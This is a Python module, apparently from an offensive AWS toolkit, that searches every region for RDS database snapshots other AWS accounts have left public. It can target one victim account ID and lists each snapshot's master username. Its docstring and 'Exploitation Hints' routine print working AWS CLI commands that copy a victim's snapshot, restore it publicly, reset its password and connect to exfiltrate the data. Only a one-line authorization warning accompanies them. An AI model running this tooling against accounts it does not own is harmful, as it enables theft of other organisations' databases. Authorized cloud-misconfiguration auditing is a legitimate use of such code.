"""
RDS Public Snapshot Discovery Module

Discovers publicly shared RDS snapshots from OTHER AWS accounts.
This is a common misconfiguration that exposes database contents to anyone.

Attack scenario:
1. Find public snapshot from target account
2. Restore it in your own VPC
3. Access the database with modified credentials
4. Exfiltrate all data

Note: This module does NOT access your own snapshots - use enumerate_rds_snapshots for that.
"""

from typing import List, Dict, Any, Optional

from botocore.exceptions import ClientError
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt

from ...aws_session import AWSSessionManager
from src.clouds.aws.utils.regions import resolve_regions, RegionalClientFactory


console = Console()


def enumerate_rds_public_snapshots(
    session_mgr: AWSSessionManager,
    target_account_id: Optional[str] = None,
    engine: Optional[str] = None,
    max_results: int = 100,
) -> None:
    """
    Search for publicly accessible RDS snapshots from other AWS accounts.

    Args:
        session_mgr: Session manager instance
        target_account_id: Filter by specific AWS account ID (12 digits)
        engine: Filter by engine type (mysql, postgres, mariadb, oracle-*, sqlserver-*)
        max_results: Maximum number of snapshots to return per region

    Stores results under 'rds_public_snapshots' in session data.
    """
    if not session_mgr.current_session_data.get("access_key"):
        console.print("[red]No credentials in current session. Run 'set_keys'.[/red]")
        return

    # Validate target account ID if provided
    if target_account_id:
        if not target_account_id.isdigit() or len(target_account_id) != 12:
            console.print("[red]Invalid account ID. Must be 12 numeric characters.[/red]")
            return

    regions = resolve_regions(session_mgr, service_name="RDS")

    console.print(
        f"[bold blue]🔍 Searching for PUBLIC RDS snapshots in regions: {', '.join(regions)}[/bold blue]"
    )
    if target_account_id:
        console.print(f"[cyan]Filtering by account: {target_account_id}[/cyan]")
    if engine:
        console.print(f"[cyan]Filtering by engine: {engine}[/cyan]")

    console.print(
        "[yellow]Note: This searches for PUBLIC snapshots from OTHER accounts (misconfigurations)[/yellow]"
    )

    client_factory = RegionalClientFactory(session_mgr)
    all_public_snapshots: List[Dict[str, Any]] = []

    for region in regions:
        console.print(f"[cyan]→ Region: {region}[/cyan]")
        try:
            rds = client_factory.get_client("rds", region)

            # Search for public DB snapshots
            try:
                filters = []
                if target_account_id:
                    # Can't directly filter by account, will filter results
                    pass
                if engine:
                    filters.append({"Name": "engine", "Values": [engine]})

                # IncludePublic=True returns only public snapshots from other accounts
                paginator = rds.get_paginator("describe_db_snapshots")
                paginate_kwargs = {
                    "IncludePublic": True,
                    "SnapshotType": "public",
                }
                if filters:
                    paginate_kwargs["Filters"] = filters

                count = 0
                for page in paginator.paginate(**paginate_kwargs):
                    for snap in page.get("DBSnapshots", []):
                        # Extract account ID from ARN
                        arn = snap.get("DBSnapshotArn", "")
                        account_id = _extract_account_from_arn(arn)

                        # Filter by target account if specified
                        if target_account_id and account_id != target_account_id:
                            continue

                        snapshot_data = {
                            "Region": region,
                            "DBSnapshotIdentifier": snap.get("DBSnapshotIdentifier", ""),
                            "DBSnapshotArn": arn,
                            "SourceAccountId": account_id,
                            "DBInstanceIdentifier": snap.get("DBInstanceIdentifier", ""),
                            "Engine": snap.get("Engine", ""),
                            "EngineVersion": snap.get("EngineVersion", ""),
                            "AllocatedStorage": snap.get("AllocatedStorage", 0),
                            "Status": snap.get("Status", ""),
                            "SnapshotCreateTime": str(snap.get("SnapshotCreateTime", ""))[:19],
                            "MasterUsername": snap.get("MasterUsername", ""),
                            "Encrypted": snap.get("Encrypted", False),
                        }
                        all_public_snapshots.append(snapshot_data)
                        count += 1

                        if count >= max_results:
                            break
                    if count >= max_results:
                        break

                if count > 0:
                    console.print(f"[green]  Found {count} public snapshot(s)[/green]")
                else:
                    console.print(f"[dim]  No public snapshots found[/dim]")

            except ClientError as e:
                code = e.response.get("Error", {}).get("Code", "")
                if code in ("AccessDenied", "AccessDeniedException"):
                    console.print(f"[yellow]  Access denied for DescribeDBSnapshots in {region}[/yellow]")
                else:
                    console.print(f"[red]  Error searching public snapshots: {code}[/red]")

        except Exception as e:
            console.print(f"[red]Search failed in region {region}: {str(e)}[/red]")

    # Save results
    session_mgr.save_enumeration_data("rds_public_snapshots", all_public_snapshots)

    # Display results
    if all_public_snapshots:
        _display_public_snapshots_table(all_public_snapshots)
        _display_attack_hints(all_public_snapshots)
    else:
        console.print("\n[yellow]No public RDS snapshots found matching criteria.[/yellow]")
        console.print("[dim]Try different regions or remove filters.[/dim]")

    console.print(
        f"\n[green]Results stored under key 'rds_public_snapshots' in session data.[/green]"
    )


def enumerate_rds_public_snapshots_interactive(session_mgr: AWSSessionManager) -> None:
    """Interactive wrapper for public snapshot discovery."""
    console.print("[bold yellow]🔍 RDS Public Snapshot Discovery[/bold yellow]")
    console.print("[dim]Find misconfigured public snapshots from other AWS accounts[/dim]\n")

    target_account = Prompt.ask(
        "[cyan]Target AWS account ID (leave empty for all)[/cyan]",
        default="",
    )

    engine = Prompt.ask(
        "[cyan]Filter by engine (mysql, postgres, etc. - leave empty for all)[/cyan]",
        default="",
    )

    max_results_str = Prompt.ask(
        "[cyan]Maximum results per region[/cyan]",
        default="50",
    )

    try:
        max_results = int(max_results_str)
    except ValueError:
        max_results = 50

    enumerate_rds_public_snapshots(
        session_mgr,
        target_account_id=target_account if target_account else None,
        engine=engine if engine else None,
        max_results=max_results,
    )


def _extract_account_from_arn(arn: str) -> str:
    """Extract AWS account ID from an ARN."""
    # arn:aws:rds:region:account-id:snapshot:name
    try:
        parts = arn.split(":")
        if len(parts) >= 5:
            return parts[4]
    except Exception:
        pass
    return "unknown"


def _display_public_snapshots_table(snapshots: List[Dict[str, Any]]) -> None:
    """Display public snapshots in a formatted table."""
    table = Table(title=f"[bold red]PUBLIC RDS Snapshots Found ({len(snapshots)})[/bold red]")
    table.add_column("Region", style="magenta")
    table.add_column("Source Account", style="red")
    table.add_column("Snapshot ID", style="cyan")
    table.add_column("Engine")
    table.add_column("Size (GB)")
    table.add_column("Created")
    table.add_column("Encrypted")
    table.add_column("Master User")

    # Sort by creation time (newest first)
    sorted_snaps = sorted(snapshots, key=lambda x: x.get("SnapshotCreateTime", ""), reverse=True)

    for snap in sorted_snaps[:100]:
        enc_flag = "[yellow]Yes[/yellow]" if snap["Encrypted"] else "[green]No[/green]"

        table.add_row(
            snap["Region"],
            snap["SourceAccountId"],
            snap["DBSnapshotIdentifier"][:35],
            f"{snap['Engine']} {snap['EngineVersion']}",
            str(snap["AllocatedStorage"]),
            snap["SnapshotCreateTime"],
            enc_flag,
            snap["MasterUsername"],
        )

    console.print(table)


def _display_attack_hints(snapshots: List[Dict[str, Any]]) -> None:
    """Display hints for exploiting public snapshots."""
    console.print("\n[bold yellow]💡 Exploitation Hints:[/bold yellow]")

    # Group by account
    accounts = {}
    for snap in snapshots:
        acc = snap["SourceAccountId"]
        if acc not in accounts:
            accounts[acc] = []
        accounts[acc].append(snap)

    console.print(f"  Found snapshots from {len(accounts)} unique account(s)")

    # Find unencrypted (easier to restore)
    unencrypted = [s for s in snapshots if not s.get("Encrypted")]
    if unencrypted:
        console.print(f"\n[green]  ✓ {len(unencrypted)} unencrypted snapshot(s) - easiest to restore[/green]")
        console.print("    [dim]No KMS key required for restoration[/dim]")

    # Show example restore command
    if snapshots:
        example = snapshots[0]
        console.print("\n[bold]Example restoration (run in AWS CLI):[/bold]")
        console.print(f"""
  [dim]# 1. Copy the snapshot to your account (if encrypted, you need KMS access)
  aws rds copy-db-snapshot \\
    --source-db-snapshot-identifier {example['DBSnapshotArn']} \\
    --target-db-snapshot-identifier my-copy-of-snapshot \\
    --source-region {example['Region']}

  # 2. Restore to a new DB instance
  aws rds restore-db-instance-from-db-snapshot \\
    --db-instance-identifier my-restored-db \\
    --db-snapshot-identifier my-copy-of-snapshot \\
    --db-instance-class db.t3.micro \\
    --publicly-accessible

  # 3. Reset master password
  aws rds modify-db-instance \\
    --db-instance-identifier my-restored-db \\
    --master-user-password YourNewPassword123!

  # 4. Connect and exfiltrate
  mysql -h <endpoint> -u {example['MasterUsername']} -p[/dim]
""")

    console.print(
        "[bold red]⚠ WARNING: Only perform these actions with explicit authorization![/bold red]"
    )
